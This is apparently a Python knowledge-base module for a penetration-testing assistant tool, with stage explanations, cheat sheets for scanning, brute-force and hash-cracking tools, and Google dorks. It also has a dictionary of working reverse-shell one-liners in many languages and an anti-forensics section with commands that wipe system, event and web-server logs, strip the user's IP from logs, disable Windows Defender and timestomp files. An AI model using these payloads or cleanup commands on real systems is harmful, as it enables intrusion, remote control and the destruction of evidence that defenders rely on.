"""Built-in knowledge base - stage explanations, tips, and tool cheat sheets."""

STAGES = {
    "recon": {
        "name": "Reconnaissance",
        "description": """Reconnaissance is the **first and most critical phase** of penetration testing.
The goal is to gather as much information about the target as possible before actively engaging it.

**Passive Recon** - No direct contact with target:
- WHOIS lookups, DNS records, search engine dorking
- Social media, job postings, leaked credentials
- Shodan, Censys, certificate transparency logs

**Active Recon** - Direct interaction with target:
- Port scanning, service enumeration
- DNS zone transfers, subdomain brute-forcing
- Web crawling, technology fingerprinting""",
        "tips": [
            "Always start with passive recon before active",
            "Document everything - even 'useless' info may help later",
            "Check for subdomains - they often have weaker security",
            "Look for exposed git repos, backup files, config files",
            "Use multiple tools to cross-validate findings",
        ],
    },
    "scanning": {
        "name": "Scanning",
        "description": """Scanning identifies **open ports, running services, and potential vulnerabilities** on the target.

**Port Scanning** - Discover which ports are open (TCP/UDP)
**Service Detection** - Identify what software is running on each port
**Version Detection** - Find exact versions for exploit matching
**OS Detection** - Fingerprint the operating system
**Vulnerability Scanning** - Run NSE scripts to find known vulns""",
        "tips": [
            "Start with a quick scan, then do targeted deep scans",
            "Don't forget UDP - DNS, SNMP, TFTP often run on UDP",
            "Use -sV -sC for service/version detection with default scripts",
            "Save output in all formats: -oA for nmap",
            "Stealth scans (-sS) are faster and less likely to be logged",
        ],
    },
    "enumeration": {
        "name": "Enumeration",
        "description": """Enumeration is the **deep-dive into discovered services** to extract detailed information.

You've found open ports - now find out exactly what's behind them:
- Web servers: hidden directories, files, APIs, parameters
- SMB shares: accessible shares, users, permissions
- SNMP: community strings, system info, network topology
- DNS: zone transfers, subdomain enumeration
- FTP/SSH: banners, allowed auth methods, anonymous access""",
        "tips": [
            "Use multiple wordlists for directory busting",
            "Check robots.txt, sitemap.xml, .well-known/ on web servers",
            "Try default/common credentials on every login panel",
            "Look for version numbers in HTTP headers and error pages",
            "SNMP community strings 'public' and 'private' are often left default",
        ],
    },
    "exploitation": {
        "name": "Exploitation",
        "description": """Exploitation is where you **leverage discovered vulnerabilities** to gain access.

**Key approaches:**
- Known CVE exploits (searchsploit, Metasploit)
- Web application attacks (SQLi, XSS, LFI/RFI, SSRF)
- Credential attacks (brute force, password spraying, hash cracking)
- Misconfigurations (default creds, open shares, weak permissions)

**Always:**
- Have explicit authorization before exploiting
- Document every step for the report
- Avoid destructive actions on production systems""",
        "tips": [
            "Search for exploits BEFORE trying to write your own",
            "Always try default credentials first",
            "SQLMap's --risk and --level options increase detection",
            "Use targeted wordlists for brute force, not just rockyou.txt",
            "Keep notes on what works and what doesn't for the report",
        ],
    },
    "post_exploitation": {
        "name": "Post-Exploitation",
        "description": """Post-exploitation focuses on **what you can do after gaining initial access**.

**Goals:**
- Privilege escalation (user -> root/admin)
- Lateral movement (pivot to other systems)
- Data exfiltration (prove impact)
- Persistence (maintain access - CTF/lab only)

**Common priv-esc vectors:**
- SUID/SGID binaries, sudo misconfigurations
- Cron jobs running as root with writable scripts
- Kernel exploits, service misconfigurations
- Stored credentials, SSH keys, config files""",
        "tips": [
            "Run LinPEAS/WinPEAS immediately after getting a shell",
            "Check sudo -l first - it's the quickest win",
            "Look for writable cron jobs and PATH hijacking",
            "Check /etc/passwd and /etc/shadow permissions",
            "Search for passwords in config files, history, and env vars",
        ],
    },
    "reporting": {
        "name": "Reporting",
        "description": """Reporting is the **final deliverable** of a penetration test.

A good report includes:
- Executive summary (non-technical overview)
- Methodology used
- Findings with severity ratings (Critical/High/Medium/Low/Info)
- Evidence (screenshots, command output, PoC)
- Remediation recommendations
- Appendices (full scan output, tool versions)""",
        "tips": [
            "Write findings as you go, not at the end",
            "Include reproduction steps for every finding",
            "Rate severity using CVSS or a consistent scale",
            "Provide specific, actionable remediation advice",
            "Proofread - the report is your professional deliverable",
        ],
    },
}

CHEATSHEETS = {
    "nmap": {
        "Quick Scan (Top 1000)": "nmap -T4 {target}",
        "Full TCP Scan": "nmap -p- -T4 {target}",
        "Service/Version Detection": "nmap -sV -sC {target}",
        "UDP Top 100": "sudo nmap -sU --top-ports 100 {target}",
        "OS Detection": "sudo nmap -O {target}",
        "Aggressive Scan": "nmap -A -T4 {target}",
        "Stealth SYN Scan": "sudo nmap -sS -T2 {target}",
        "Vulnerability Scan": "nmap --script vuln {target}",
        "All Ports + Versions": "nmap -p- -sV -sC -T4 -oA scan_{target} {target}",
        "Specific Port Range": "nmap -p {ports} -sV {target}",
        "SMB Enumeration": "nmap --script smb-enum-shares,smb-enum-users -p 445 {target}",
        "HTTP Enumeration": "nmap --script http-enum -p 80,443 {target}",
    },
    "gobuster": {
        "Directory Scan": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
        "With Extensions": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak",
        "VHOST Scan": "gobuster vhost -u http://{target} -w /usr/share/wordlists/subdomains.txt",
        "DNS Subdomain": "gobuster dns -d {target} -w /usr/share/wordlists/subdomains.txt",
        "With Status Codes": "gobuster dir -u http://{target} -w wordlist.txt -s 200,301,302,403",
    },
    "ffuf": {
        "Directory Fuzz": "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt",
        "Extension Fuzz": "ffuf -u http://{target}/FUZZ -w wordlist.txt -e .php,.html,.txt",
        "Subdomain Fuzz": "ffuf -u http://FUZZ.{target} -w subdomains.txt -H 'Host: FUZZ.{target}'",
        "Parameter Fuzz": "ffuf -u http://{target}/page?FUZZ=test -w params.txt",
        "POST Data Fuzz": "ffuf -u http://{target}/login -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt",
        "Filter by Size": "ffuf -u http://{target}/FUZZ -w wordlist.txt -fs 0",
    },
    "sqlmap": {
        "Basic Test": "sqlmap -u 'http://{target}/page?id=1' --batch",
        "POST Request": "sqlmap -u 'http://{target}/login' --data='user=admin&pass=test' --batch",
        "Dump Database": "sqlmap -u 'http://{target}/page?id=1' --dump --batch",
        "List Databases": "sqlmap -u 'http://{target}/page?id=1' --dbs --batch",
        "OS Shell": "sqlmap -u 'http://{target}/page?id=1' --os-shell --batch",
        "With Cookie": "sqlmap -u 'http://{target}/page?id=1' --cookie='session=abc123' --batch",
        "Increase Level": "sqlmap -u 'http://{target}/page?id=1' --level=5 --risk=3 --batch",
        "From Burp Request": "sqlmap -r request.txt --batch",
    },
    "hydra": {
        "SSH Brute Force": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} ssh",
        "FTP Brute Force": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} ftp",
        "HTTP POST Login": "hydra -l {user} -P passwords.txt {target} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
        "HTTP Basic Auth": "hydra -l {user} -P passwords.txt {target} http-get /admin",
        "RDP Brute Force": "hydra -l {user} -P passwords.txt {target} rdp",
        "MySQL Brute Force": "hydra -l root -P passwords.txt {target} mysql",
        "User List": "hydra -L users.txt -P passwords.txt {target} ssh",
    },
    "john": {
        "Crack with Wordlist": "john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}",
        "Show Cracked": "john --show {hashfile}",
        "Specific Format": "john --format={format} --wordlist=wordlist.txt {hashfile}",
        "With Rules": "john --wordlist=wordlist.txt --rules {hashfile}",
        "Unshadow First": "unshadow /etc/passwd /etc/shadow > unshadowed.txt",
        "Crack ZIP": "zip2john file.zip > zip.hash && john zip.hash",
        "Crack SSH Key": "ssh2john id_rsa > ssh.hash && john ssh.hash",
    },
    "hashcat": {
        "MD5": "hashcat -m 0 {hashfile} /usr/share/wordlists/rockyou.txt",
        "SHA1": "hashcat -m 100 {hashfile} /usr/share/wordlists/rockyou.txt",
        "SHA256": "hashcat -m 1400 {hashfile} /usr/share/wordlists/rockyou.txt",
        "NTLM": "hashcat -m 1000 {hashfile} /usr/share/wordlists/rockyou.txt",
        "bcrypt": "hashcat -m 3200 {hashfile} /usr/share/wordlists/rockyou.txt",
        "WPA2": "hashcat -m 22000 {hashfile} /usr/share/wordlists/rockyou.txt",
        "With Rules": "hashcat -m 0 {hashfile} wordlist.txt -r rules/best64.rule",
    },
    "searchsploit": {
        "Basic Search": "searchsploit {query}",
        "Exact Match": "searchsploit -e '{query}'",
        "Copy to Current Dir": "searchsploit -m {exploit_id}",
        "Show Full Path": "searchsploit -p {exploit_id}",
        "JSON Output": "searchsploit --json {query}",
        "Exclude Terms": "searchsploit {query} --exclude='DoS'",
    },
    "nikto": {
        "Basic Scan": "nikto -h http://{target}",
        "With SSL": "nikto -h https://{target} -ssl",
        "Specific Port": "nikto -h {target} -p {port}",
        "Save Output": "nikto -h http://{target} -o nikto_results.txt",
        "Tuning": "nikto -h http://{target} -Tuning 123bde",
    },
    "subfinder": {
        "Basic": "subfinder -d {target}",
        "Silent Output": "subfinder -d {target} -silent",
        "Save to File": "subfinder -d {target} -o subdomains.txt",
        "With Sources": "subfinder -d {target} -sources shodan,censys",
    },
    "theHarvester": {
        "All Sources": "theHarvester -d {target} -b all",
        "Specific Source": "theHarvester -d {target} -b google,bing,linkedin",
        "Save Output": "theHarvester -d {target} -b all -f results",
    },
}

REVERSE_SHELLS = {
    "Bash TCP": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "Bash UDP": "bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
    "Python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "Python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "PHP": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "Perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
    "Ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "Netcat (traditional)": "nc -e /bin/sh {lhost} {lport}",
    "Netcat (OpenBSD)": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "PowerShell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    "Socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
}

GOOGLE_DORKS = {
    "Sensitive Files": "site:{target} filetype:pdf OR filetype:doc OR filetype:xls OR filetype:csv",
    "Config Files": "site:{target} filetype:xml OR filetype:conf OR filetype:env OR filetype:ini",
    "Backup Files": "site:{target} filetype:bak OR filetype:old OR filetype:backup",
    "Login Pages": "site:{target} inurl:login OR inurl:signin OR inurl:admin",
    "Admin Panels": "site:{target} intitle:\"admin\" OR inurl:admin OR inurl:dashboard",
    "Directory Listing": "site:{target} intitle:\"index of\"",
    "Exposed Git": "site:{target} inurl:.git",
    "Error Messages": "site:{target} \"error\" OR \"warning\" OR \"syntax\" OR \"SQL\"",
    "Database Files": "site:{target} filetype:sql OR filetype:db OR filetype:sqlite",
    "Passwords in URLs": "site:{target} inurl:password OR inurl:passwd OR inurl:pass",
    "PHP Info": "site:{target} inurl:phpinfo.php OR intitle:phpinfo",
    "WordPress": "site:{target} inurl:wp-admin OR inurl:wp-content OR inurl:wp-login",
    "Open Redirects": "site:{target} inurl:redirect OR inurl:url= OR inurl:return=",
    "API Endpoints": "site:{target} inurl:api OR inurl:v1 OR inurl:v2 OR filetype:json",
}

PRIV_ESC_CHECKLIST = {
    "linux": [
        "sudo -l  (Check sudo permissions)",
        "find / -perm -4000 2>/dev/null  (Find SUID binaries)",
        "find / -perm -2000 2>/dev/null  (Find SGID binaries)",
        "cat /etc/crontab && ls -la /etc/cron.*  (Check cron jobs)",
        "ls -la /etc/passwd /etc/shadow  (Check file permissions)",
        "cat /etc/passwd | grep -v nologin  (List users with login)",
        "env  (Check environment variables)",
        "cat ~/.bash_history  (Check command history)",
        "find / -writable -type f 2>/dev/null  (Find writable files)",
        "cat /etc/os-release  (OS version for kernel exploits)",
        "uname -a  (Kernel version)",
        "dpkg -l OR rpm -qa  (Installed packages)",
        "netstat -tulpn  (Listening services)",
        "ps aux  (Running processes)",
        "find / -name '*.conf' -readable 2>/dev/null  (Readable config files)",
        "find / -name 'id_rsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null  (SSH keys)",
        "cat /proc/version  (Kernel info)",
        "getcap -r / 2>/dev/null  (Linux capabilities)",
    ],
    "windows": [
        "whoami /all  (Current user privileges)",
        "net user  (List users)",
        "net localgroup administrators  (Admin group members)",
        "systeminfo  (OS version, patches)",
        "wmic service list brief  (Running services)",
        "schtasks /query /fo LIST /v  (Scheduled tasks)",
        "netstat -ano  (Listening ports)",
        "reg query HKLM /f password /t REG_SZ /s  (Passwords in registry)",
        "dir /s /b *.txt *.ini *.cfg *.config  (Config files)",
        "cmdkey /list  (Stored credentials)",
        "powershell Get-Process  (Running processes)",
    ],
}

# ─── Footprint Erasure Knowledge Base ─────────────────────────────────────────

STAGES["footprint_erasure"] = {
    "name": "Footprint Erasure",
    "description": """Footprint erasure is the **final phase** of a penetration test where you
**remove all evidence** of your activity from the target system.

**Why it matters:**
- Authorized pentests require cleanup to leave systems in original state
- In CTFs, covering tracks is often part of the challenge
- Understanding anti-forensics helps defenders detect attackers

**Key areas to clean:**
- System logs (auth, syslog, event viewer)
- Shell history (bash, zsh, PowerShell)
- Web server access/error logs
- SSH artifacts (known_hosts, authorized_keys)
- Uploaded tools and scripts
- File timestamps (timestomping)
- Network artifacts (ARP cache, DNS cache, firewall rules)""",
    "tips": [
        "Always clean up BEFORE disconnecting from target",
        "Remove specific log lines (your IP) rather than wiping entire logs — empty logs are suspicious",
        "Timestomp modified files to match surrounding files",
        "Securely delete files (shred/rm -P) — don't just rm",
        "Clear in-memory history (history -c) as well as on-disk files",
        "Remove any SSH keys or credentials you added",
        "Flush DNS and ARP caches to remove connection evidence",
        "Check for .bash_history, .zsh_history, .python_history, .mysql_history, .lesshst, .viminfo",
        "Don't forget /var/log/wtmp, /var/log/btmp, /var/log/lastlog",
        "In a real pentest, document what you cleaned for the report BEFORE cleaning",
    ],
}

ANTI_FORENSICS = {
    "linux": [
        ("Clear auth log", "cat /dev/null > /var/log/auth.log"),
        ("Clear syslog", "cat /dev/null > /var/log/syslog"),
        ("Clear kernel log", "cat /dev/null > /var/log/kern.log"),
        ("Clear daemon log", "cat /dev/null > /var/log/daemon.log"),
        ("Clear messages", "cat /dev/null > /var/log/messages"),
        ("Clear wtmp (login records)", "cat /dev/null > /var/log/wtmp"),
        ("Clear btmp (failed logins)", "cat /dev/null > /var/log/btmp"),
        ("Clear lastlog", "cat /dev/null > /var/log/lastlog"),
        ("Clear journal logs", "journalctl --flush --rotate && journalctl --vacuum-time=1s"),
        ("Remove specific IP from auth.log", "sed -i '/{ip}/d' /var/log/auth.log"),
        ("Remove specific IP from syslog", "sed -i '/{ip}/d' /var/log/syslog"),
        ("Clear bash history", "cat /dev/null > ~/.bash_history && history -c"),
        ("Clear zsh history", "cat /dev/null > ~/.zsh_history"),
        ("Clear all shell histories", "rm -f ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history ~/.lesshst ~/.viminfo"),
        ("Unset history file", "unset HISTFILE"),
        ("Disable history for session", "export HISTSIZE=0"),
        ("Clear /tmp artifacts", "rm -rf /tmp/.* /tmp/* 2>/dev/null"),
        ("Clear cron evidence", "crontab -r"),
        ("Overwrite free disk space", "dd if=/dev/zero of=/tmp/zero bs=1M; rm -f /tmp/zero"),
        ("Remove SUID binaries you planted", "find / -user $(whoami) -perm -4000 2>/dev/null"),
    ],
    "windows": [
        ("Clear System event log", "wevtutil cl System"),
        ("Clear Security event log", "wevtutil cl Security"),
        ("Clear Application event log", "wevtutil cl Application"),
        ("Clear PowerShell event log", "wevtutil cl 'Windows PowerShell'"),
        ("Clear all event logs", "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\""),
        ("Clear PowerShell history", "del (Get-PSReadlineOption).HistorySavePath"),
        ("Clear recent files", "del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\*"),
        ("Clear prefetch", "del /F /Q C:\\Windows\\Prefetch\\*"),
        ("Clear thumbnail cache", "del /F /Q %LOCALAPPDATA%\\Microsoft\\Windows\\Explorer\\thumbcache_*"),
        ("Clear RDP connection cache", "reg delete \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f"),
        ("Clear Run dialog history", "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" /va /f"),
        ("Clear DNS cache", "ipconfig /flushdns"),
        ("Disable Windows Defender logging", "Set-MpPreference -DisableRealtimeMonitoring $true"),
        ("Clear temp files", "del /F /S /Q %TEMP%\\*"),
        ("Timestomp a file (PowerShell)", "(Get-Item file.txt).LastWriteTime = '01/01/2024 12:00:00'"),
    ],
    "webserver": [
        ("Clear Apache access log", "cat /dev/null > /var/log/apache2/access.log"),
        ("Clear Apache error log", "cat /dev/null > /var/log/apache2/error.log"),
        ("Clear Nginx access log", "cat /dev/null > /var/log/nginx/access.log"),
        ("Clear Nginx error log", "cat /dev/null > /var/log/nginx/error.log"),
        ("Remove IP from Apache log", "sed -i '/{ip}/d' /var/log/apache2/access.log"),
        ("Remove IP from Nginx log", "sed -i '/{ip}/d' /var/log/nginx/access.log"),
        ("Clear IIS logs", "del /F /Q C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*"),
    ],
    "ssh": [
        ("Remove host from known_hosts", "ssh-keygen -R {host}"),
        ("Clear all known_hosts", "cat /dev/null > ~/.ssh/known_hosts"),
        ("Clear SSH agent keys", "ssh-add -D"),
        ("Remove authorized key you added", "sed -i '/{key_identifier}/d' ~/.ssh/authorized_keys"),
        ("Clear SSH logs", "cat /dev/null > /var/log/auth.log"),
    ],
    "network": [
        ("Flush ARP cache (Linux)", "ip -s -s neigh flush all"),
        ("Flush ARP cache (macOS)", "sudo arp -d -a"),
        ("Flush DNS cache (Linux)", "systemd-resolve --flush-caches"),
        ("Flush DNS cache (macOS)", "sudo dscacheutil -flushcache && sudo killall -HUP mDNSResponder"),
        ("Flush DNS cache (Windows)", "ipconfig /flushdns"),
        ("Remove iptables rules", "iptables -F && iptables -X"),
        ("Remove pf rules (macOS)", "sudo pfctl -F all"),
        ("Kill background connections", "kill $(lsof -t -i @{ip}) 2>/dev/null"),
    ],
}
